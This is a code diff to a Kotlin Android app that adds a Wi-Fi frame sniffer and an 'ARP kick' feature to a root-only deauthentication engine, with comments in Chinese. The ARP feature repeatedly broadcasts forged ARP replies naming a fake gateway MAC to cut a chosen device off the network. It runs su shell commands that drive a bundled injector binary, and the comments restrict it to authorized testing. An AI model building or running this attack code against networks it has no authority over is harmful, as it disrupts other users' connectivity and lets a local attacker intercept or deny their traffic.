@@ -56,7 +56,16 @@ data class DeauthSession(
  *
  * 只做用户自己设备/授权范围的操作;未 root 的设备上引擎根本不可启动。
  */
-class WifiDeauthEngine(private val context: Context) {
+class WifiDeauthEngine private constructor(private val context: Context) {
+
+    companion object {
+        @Volatile private var instance: WifiDeauthEngine? = null
+
+        /** 进程级单例:雷达/去认证页/ARP 页共享同一份探测结果与注入会话 */
+        fun get(context: Context): WifiDeauthEngine = instance ?: synchronized(this) {
+            instance ?: WifiDeauthEngine(context.applicationContext).also { instance = it }
+        }
+    }
 
     private val _session = MutableStateFlow(DeauthSession())
     val session: StateFlow<DeauthSession> = _session
@@ -206,6 +215,117 @@ class WifiDeauthEngine(private val context: Context) {
         _session.value = _session.value.copy(phase = "正在停止…")
         suProcess?.let { runCatching { it.destroy() } }
         _session.value.probe?.iface?.let { restoreManagedMode(it) }
+    }
+
+    /**
+     * 被动嗅探模式 —— 同一原生二进制 capture 子命令:
+     * 监控模式下逐帧解析 radiotap + 802.11 管理帧(信标/探测/去认证/关联),
+     * 输出 "FRAME <type> <src> <dst> <ssid>" 流式进入日志。
+     * root + 监控模式前提与注入模式相同;无 root 设备上返回失败原因。
+     */
+    fun startCapture(channel: Int): String? {
+        if (_session.value.running) return "会话已在运行"
+        val probe = _session.value.probe
+        if (probe == null || !probe.rootGranted) return "无 root —— 嗅探在无 root 的 stock Android 上不可实现"
+        if (!probe.monitorSupported) return "芯片/固件不支持监控模式"
+        val iface = probe.iface ?: return "未发现无线接口"
+
+        stopRequested = false
+        framesSent.set(0)
+        _session.value = DeauthSession(running = true, phase = "被动嗅探", probe = probe)
+        val injectorPath = extractBundledInjector()
+            ?: return "内置嗅探器缺失"
+        val cmd = buildList {
+            add("set -e")
+            if (probe.nexutil) add("nexutil -m2") else add("iw dev $iface set type monitor")
+            add("ip link set $iface up")
+            if (channel in 1..165) add("iw dev $iface set channel $channel")
+            add("$injectorPath capture $iface")
+        }.joinToString("\n") + "\n"
+
+        appendLog("▸ 被动嗅探启动 · $iface · 监听信标/探测/去认证帧")
+        Thread({
+            try {
+                val su = ProcessBuilder("su").redirectErrorStream(true).start()
+                suProcess = su
+                su.outputStream.write(cmd.toByteArray())
+                su.outputStream.flush()
+                val reader = BufferedReader(InputStreamReader(su.inputStream))
+                while (!stopRequested) {
+                    val line = reader.readLine() ?: break
+                    appendLog(line.take(160))
+                    if (line.startsWith("FRAME ")) framesSent.incrementAndGet()
+                    _session.value = _session.value.copy(framesSent = framesSent.get())
+                }
+                if (stopRequested) runCatching { su.destroy() }
+                runCatching { reader.close() }
+            } catch (t: Throwable) {
+                appendLog("[!] 嗅探会话异常: ${t.message}")
+            } finally {
+                suProcess = null
+                restoreManagedMode(iface)
+                _session.value = _session.value.copy(running = false, phase = "已停止 · 接口已恢复 managed")
+                appendLog("▸ 嗅探会话结束 · 共解析 ${framesSent.get()} 帧")
+            }
+        }, "wifi-frame-sniffer").start()
+        return null
+    }
+
+    /**
+     * ARP 投毒踢人 —— 向目标持续广播伪造 ARP 应答,宣称网关位于假 MAC,
+     * 目标设备的 ARP 缓存被投毒后其上行流量黑洞,等效被踢出网络。
+     *
+     * 诚实边界(UI 必须呈现):
+     * - 需要 root;部分设备 SELinux 连 root 也拒绝 AF_PACKET(会如实报 Permission denied)
+     * - 仅对动态 ARP 缓存的客户端有效;启用 ARP 防欺骗/静态 ARP 的设备免疫
+     * - 停止后目标 ARP 缓存过期(30-60s)自动恢复网络;这是主动干扰,仅限授权测试
+     * - 接口保持 managed 模式(ARP 是二层广播,不需要监控模式)
+     */
+    fun startArpKick(targetIp: String, gatewayIp: String, count: Int, intervalMs: Long): String? {
+        if (_session.value.running) return "会话已在运行"
+        val probe = _session.value.probe
+        if (probe == null || !probe.rootGranted) return "无 root —— ARP 投毒需要 root"
+        val iface = probe.iface ?: return "未发现无线接口"
+        val ipRe = Regex("^\\d{1,3}(\\.\\d{1,3}){3}$")
+        if (!ipRe.matches(targetIp)) return "目标 IP 格式无效: $targetIp"
+        if (!ipRe.matches(gatewayIp)) return "网关 IP 格式无效: $gatewayIp"
+
+        stopRequested = false
+        framesSent.set(0)
+        _session.value = DeauthSession(running = true, phase = "ARP 踢人", probe = probe)
+        val injectorPath = extractBundledInjector()
+            ?: return "内置引擎缺失"
+        val cmd = buildList {
+            add("set -e")
+            add("ip link set $iface up")
+            add("$injectorPath arpkick $iface $targetIp $gatewayIp $count ${intervalMs.coerceAtLeast(100)}")
+        }.joinToString("\n") + "\n"
+
+        appendLog("▸ ARP 踢人启动 · 目标 $targetIp · 网关 $gatewayIp · $iface")
+        Thread({
+            try {
+                val su = ProcessBuilder("su").redirectErrorStream(true).start()
+                suProcess = su
+                su.outputStream.write(cmd.toByteArray())
+                su.outputStream.flush()
+                val reader = BufferedReader(InputStreamReader(su.inputStream))
+                while (!stopRequested) {
+                    val line = reader.readLine() ?: break
+                    appendLog(line.take(160))
+                    if (line.startsWith("ARPKICK ")) framesSent.incrementAndGet()
+                    _session.value = _session.value.copy(framesSent = framesSent.get())
+                }
+                if (stopRequested) runCatching { su.destroy() }
+                runCatching { reader.close() }
+            } catch (t: Throwable) {
+                appendLog("[!] ARP 会话异常: ${t.message}")
+            } finally {
+                suProcess = null
+                _session.value = _session.value.copy(running = false, phase = "已停止")
+                appendLog("▸ ARP 会话结束 · 共投毒 ${framesSent.get()} 帧 · 目标缓存过期后自动恢复网络")
+            }
+        }, "arp-kick").start()
+        return null
     }
 
     private fun restoreManagedMode(iface: String) {
